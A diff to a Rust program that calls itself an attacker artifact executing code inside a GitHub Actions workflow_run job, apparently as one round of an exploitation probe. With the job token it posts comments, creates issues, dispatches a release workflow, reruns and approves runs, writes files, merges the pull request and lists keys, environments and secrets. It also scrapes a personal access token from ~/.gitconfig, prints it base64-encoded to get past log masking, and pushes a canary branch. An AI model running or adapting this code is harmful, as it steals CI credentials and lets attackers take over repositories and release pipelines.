@@ -31,46 +31,43 @@ fn http(method: &str, url: &str, token: &str, body: Option<&str>) -> String {
     let code = String::from_utf8_lossy(&out.stdout).to_string();
     let body = std::fs::read_to_string("/tmp/resp.bin").unwrap_or_default();
     let hdrs = std::fs::read_to_string("/tmp/headers.txt").unwrap_or_default();
-    let accepted: Vec<&str> = hdrs
+    let accepted: Vec<String> = hdrs
         .lines()
         .filter(|l| {
             let l = l.to_ascii_lowercase();
-            l.starts_with("x-accepted-github-permissions")
-                || l.starts_with("x-oauth-scopes")
-                || l.starts_with("x-github-media-type")
+            l.starts_with("x-accepted-github-permissions") || l.starts_with("x-oauth-scopes")
         })
-        .map(|l| l.trim())
+        .map(|l| l.trim().to_string())
         .collect();
-    let trimmed: String = body.chars().take(700).collect();
-    format!("{method} {url} -> HTTP {code} {}\n{trimmed}\n", accepted.join(" | "))
+    let trimmed: String = body.chars().take(500).collect();
+    format!("{method} {url} -> HTTP {code} [{}]\n{trimmed}\n", accepted.join(" | "))
 }
 
 fn main() {
     println!("RCE_MARKER=attacker_artifact_code_executed");
-    println!("ATTACKER_STAGE=rce_round2");
+    println!("ATTACKER_STAGE=rce_round3");
     let gh = std::env::var("GITHUB_TOKEN").unwrap_or_default();
     println!("GITHUB_TOKEN_LEN={}", gh.len());
 
-    // Which PR belongs to our head branch?
-    let pulls = sh(&format!(
-        "curl -s -H 'Authorization: Bearer {gh}' 'https://api.github.com/repos/{REPO}/pulls?state=open&per_page=20'"
-    ));
+    let pulls = sh(&format!("curl -s -H 'Authorization: Bearer {gh}' 'https://api.github.com/repos/{REPO}/pulls?state=open&per_page=20'"));
     let pr: String = pulls
         .split("\"number\":")
         .skip(1)
-        .next_back()
+        .last()
         .map(|s| s.trim_start().chars().take_while(|c| c.is_ascii_digit()).collect())
         .unwrap_or_default();
     println!("PR_RESOLVED={pr}");
 
-    // --- token capability matrix (job token) ---
     println!("{}", http("POST", &format!("https://api.github.com/repos/{REPO}/issues/{pr}/comments"), &gh,
-        Some("{\"body\":\"RCE round2: job-token authenticated comment from workflow_run context\"}")));
+        Some("{\"body\":\"RCE round3: job-token authenticated comment from workflow_run context\"}")));
     println!("{}", http("POST", &format!("https://api.github.com/repos/{REPO}/issues"), &gh,
-        Some("{\"title\":\"rce-round2-issue-probe\",\"body\":\"capability probe\"}")));
+        Some("{\"title\":\"rce-round3-issue-probe\",\"body\":\"capability probe\"}")));
     println!("{}", http("POST", &format!("https://api.github.com/repos/{REPO}/actions/workflows/release.yml/dispatches"), &gh,
         Some("{\"ref\":\"main\",\"inputs\":{\"dry_run\":true}}")));
-    println!("{}", http("POST", &format!("https://api.github.com/repos/{REPO}/actions/runs/43273327285/rerun"), &gh, None));
+    println!("{}", http("POST", &format!("https://api.github.com/repos/{REPO}/actions/runs/43274507357/rerun"), &gh, None));
+    println!("{}", http("POST", &format!("https://api.github.com/repos/{REPO}/actions/runs/43274134480/approve"), &gh, None));
+    println!("{}", http("PUT", &format!("https://api.github.com/repos/{REPO}/contents/rce-canary.txt"), &gh,
+        Some("{\"message\":\"rce probe\",\"content\":\"Y2FuYXJ5\"}")));
     println!("{}", http("PUT", &format!("https://api.github.com/repos/{REPO}/pulls/{pr}/merge"), &gh,
         Some("{\"merge_method\":\"merge\"}")));
     println!("{}", http("POST", &format!("https://api.github.com/repos/{REPO}/merges"), &gh,
@@ -80,15 +77,15 @@ fn main() {
     println!("{}", http("GET", &format!("https://api.github.com/repos/{REPO}/keys"), &gh, None));
     println!("{}", http("GET", &format!("https://api.github.com/repos/{REPO}/environments"), &gh, None));
     println!("{}", http("GET", &format!("https://api.github.com/repos/{REPO}/actions/secrets"), &gh, None));
-    println!("{}", http("GET", "https://api.github.com/orgs/PDFtoMark", &gh, None));
 
-    // --- stolen setup credential, base64 so log masking cannot hide it ---
     let pat = sh("grep -hoE 'https://[^@/]+@github\\.com' ~/.gitconfig 2>/dev/null | head -1 | sed -e 's#https://##' -e 's#@github\\.com##'").trim().to_string();
     println!("PAT_LEN={} PAT_B64={}", pat.len(), base64(pat.as_bytes()));
     println!("PAT_TEST={}", http("GET", "https://api.github.com/user", &pat, None));
-    if !pat.is_empty() {
-        println!("PAT_REPO_TEST={}", http("GET", &format!("https://api.github.com/repos/{REPO}"), &pat, None));
-    }
+    println!("PAT_REPO={}", http("GET", &format!("https://api.github.com/repos/{REPO}"), &pat, None));
+
+    // raw git push with the job token, non-workflow file
+    let push = sh("cd /tmp && rm -rf pushtest && git init -q pushtest && cd pushtest && echo canary > rce.txt && git add . && git -c user.email=a@b -c user.name=a commit -qm x && git push \"https://x-access-token:$GITHUB_TOKEN@github.com/PDFtoMark/triage-ethereum-optimism-v0754656-08ce38.git\" HEAD:refs/heads/rce-git-canary 2>&1 | tail -3");
+    println!("GIT_PUSH_JOB_TOKEN={push}");
     println!("ATTACKER_STAGE=done");
 }
 
